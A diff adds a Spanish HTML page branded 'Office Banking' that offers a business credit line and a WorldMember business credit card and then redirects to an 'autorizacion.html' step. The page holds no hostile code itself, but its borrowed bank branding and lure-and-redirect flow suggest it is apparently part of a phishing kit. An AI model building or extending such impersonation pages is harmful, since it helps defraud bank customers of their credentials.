@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Productos</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="login-box">
+    <img src="logo-office-banking.png" alt="Office Banking" class="logo">
+
+    <h1>PRODUCTOS DISPONIBLES PARA TU EMPRESA:</h1>
+
+    <div class="producto">
+      <label><input type="radio" name="opcion" value="linea"> 
+        1.- Línea de Crédito por $<span id="monto"></span>
+      </label>
+    </div>
+
+    <div class="producto">
+      <label><input type="radio" name="opcion" value="tarjeta"> 
+        2.- Tarjeta de Crédito WorldMember Limited Business por $<span id="monto2"></span>
+      </label>
+    </div>
+
+    <button id="quieroBtn" class="btn-rojo">Lo Quiero</button>
+
+    <div id="mensaje"></div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const linea = localStorage.getItem("lineaMonto") || 5000000;
+      const tarjeta = localStorage.getItem("tarjetaMonto") || linea;
+      document.getElementById("monto").innerText = linea;
+      document.getElementById("monto2").innerText = tarjeta;
+    });
+
+    document.getElementById("quieroBtn").addEventListener("click", function(){
+      document.getElementById("mensaje").innerText = 
+        "Serás redirigido al área de autorización...";
+      setTimeout(()=> window.location.href = "autorizacion.html", 2000);
+    });
+  </script>
+</body>
+</html>
